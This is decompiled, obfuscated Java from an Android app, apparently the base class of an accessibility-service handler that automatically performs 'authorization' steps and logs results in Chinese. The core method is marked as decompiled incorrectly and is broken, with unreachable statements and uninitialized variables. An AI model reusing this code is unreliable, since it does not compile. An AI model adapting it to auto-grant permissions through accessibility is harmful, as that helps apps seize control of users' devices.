package com.storm.safe.rock.service.modules.base;

import android.content.Context;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.yw5xud.C0372a9;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashSet;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import p000.AbstractC0003a2;
import p000.C0147bu;
import p000.kg1;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.base.a0 */
/* loaded from: classes2.dex */
public abstract class AbstractC0330a0 {

    /* renamed from: a0 */
    public final dqtvuisjd f53208a0;

    /* renamed from: a1 */
    public final Context f53209a1;

    /* renamed from: a2 */
    public final LinkedHashSet f53210a2;

    public AbstractC0330a0(dqtvuisjd dqtvuisjdVar, Context context) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(context, "context");
        this.f53208a0 = dqtvuisjdVar;
        this.f53209a1 = context;
        this.f53210a2 = new LinkedHashSet();
        new LinkedHashSet();
    }

    /* renamed from: a0 */
    public final void m211769a0() {
        LinkedHashSet linkedHashSet = this.f53210a2;
        t60.m214695b6(linkedHashSet, "nodes");
        t60.m214695b6(((C0372a9) this).f55146a3, "tag");
        if (linkedHashSet.isEmpty()) {
            return;
        }
        Iterator it = linkedHashSet.iterator();
        while (it.hasNext()) {
            try {
                ((AccessibilityNodeInfo) it.next()).recycle();
            } catch (Exception unused) {
            }
        }
        linkedHashSet.clear();
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:34:0x00a2  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x00a9  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x00ac  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Type inference failed for: r10v0, types: [com.storm.safe.rock.service.modules.base.a0] */
    /* JADX WARN: Type inference failed for: r2v10, types: [com.storm.safe.rock.service.modules.base.a0] */
    /* JADX WARN: Type inference failed for: r2v13 */
    /* JADX WARN: Type inference failed for: r2v17 */
    /* JADX WARN: Type inference failed for: r2v18 */
    /* JADX WARN: Type inference failed for: r2v19 */
    /* JADX WARN: Type inference failed for: r2v2, types: [com.storm.safe.rock.service.modules.base.BaseAuthorizationHandler$executeAuthorization$1, kotlin.coroutines.jvm.internal.ContinuationImpl] */
    /* JADX WARN: Type inference failed for: r2v20 */
    /* JADX WARN: Type inference failed for: r2v3 */
    /* JADX WARN: Type inference failed for: r2v4, types: [com.storm.safe.rock.service.modules.base.a0] */
    /* JADX WARN: Type inference failed for: r2v5 */
    /* JADX WARN: Type inference failed for: r2v8 */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211770a1(ContinuationImpl continuationImpl) throws Throwable {
        ?? baseAuthorizationHandler$executeAuthorization$1;
        ArrayList arrayList;
        ArrayList arrayList2;
        ArrayList arrayList3;
        Exception e;
        AbstractC0330a0 abstractC0330a0;
        boolean z;
        if (continuationImpl instanceof BaseAuthorizationHandler$executeAuthorization$1) {
            BaseAuthorizationHandler$executeAuthorization$1 baseAuthorizationHandler$executeAuthorization$12 = (BaseAuthorizationHandler$executeAuthorization$1) continuationImpl;
            int i = baseAuthorizationHandler$executeAuthorization$12.f53207a6;
            if ((i & Integer.MIN_VALUE) != 0) {
                baseAuthorizationHandler$executeAuthorization$12.f53207a6 = i - Integer.MIN_VALUE;
                baseAuthorizationHandler$executeAuthorization$1 = baseAuthorizationHandler$executeAuthorization$12;
            } else {
                baseAuthorizationHandler$executeAuthorization$1 = new BaseAuthorizationHandler$executeAuthorization$1(this, continuationImpl);
            }
        }
        Object obj = baseAuthorizationHandler$executeAuthorization$1.f53205a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = baseAuthorizationHandler$executeAuthorization$1.f53207a6;
        try {
            if (i2 != 0) {
                if (i2 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                arrayList3 = baseAuthorizationHandler$executeAuthorization$1.f53204a3;
                arrayList2 = baseAuthorizationHandler$executeAuthorization$1.f53203a2;
                arrayList = baseAuthorizationHandler$executeAuthorization$1.f53202a1;
                abstractC0330a0 = baseAuthorizationHandler$executeAuthorization$1.f53201a0;
                try {
                    kg1.m213544f4(obj);
                    baseAuthorizationHandler$executeAuthorization$1 = abstractC0330a0;
                } catch (Exception e2) {
                    e = e2;
                }
                baseAuthorizationHandler$executeAuthorization$1.m211769a0();
                z = !arrayList.isEmpty() && arrayList2.isEmpty();
                if (!z) {
                    t60.m214726f4(((C0372a9) baseAuthorizationHandler$executeAuthorization$1).f55146a3, AbstractC0003a2.m31b2("⚠️ 授权配置部分失败（完成: ", arrayList.size(), ", 失败: ", arrayList2.size(), "）"));
                }
                return new C0147bu(z, arrayList, arrayList2, arrayList3);
            }
            kg1.m213544f4(obj);
            arrayList = new ArrayList();
            arrayList2 = new ArrayList();
            ArrayList arrayList4 = new ArrayList();
            try {
                baseAuthorizationHandler$executeAuthorization$1.f53201a0 = this;
                baseAuthorizationHandler$executeAuthorization$1.f53202a1 = arrayList;
                baseAuthorizationHandler$executeAuthorization$1.f53203a2 = arrayList2;
                baseAuthorizationHandler$executeAuthorization$1.f53204a3 = arrayList4;
                baseAuthorizationHandler$executeAuthorization$1.f53207a6 = 1;
            } catch (Exception e3) {
                arrayList3 = arrayList4;
                e = e3;
                abstractC0330a0 = this;
            } catch (Throwable th) {
                th = th;
                baseAuthorizationHandler$executeAuthorization$1 = this;
                baseAuthorizationHandler$executeAuthorization$1.m211769a0();
                throw th;
            }
            if (mo211771a2(arrayList, arrayList2, arrayList4, baseAuthorizationHandler$executeAuthorization$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
            baseAuthorizationHandler$executeAuthorization$1 = this;
            arrayList3 = arrayList4;
            baseAuthorizationHandler$executeAuthorization$1.m211769a0();
            if (arrayList.isEmpty()) {
            }
            if (!z) {
            }
            return new C0147bu(z, arrayList, arrayList2, arrayList3);
            t60.m214705c6(((C0372a9) abstractC0330a0).f55146a3, "❌ 授权异常: " + e.getMessage(), e);
            arrayList2.add("系统异常: " + e.getMessage());
            baseAuthorizationHandler$executeAuthorization$1 = abstractC0330a0;
            baseAuthorizationHandler$executeAuthorization$1.m211769a0();
            if (arrayList.isEmpty()) {
            }
            if (!z) {
            }
            return new C0147bu(z, arrayList, arrayList2, arrayList3);
        } catch (Throwable th2) {
            th = th2;
        }
    }

    /* renamed from: a2 */
    public abstract Object mo211771a2(ArrayList arrayList, ArrayList arrayList2, ArrayList arrayList3, ContinuationImpl continuationImpl);
}
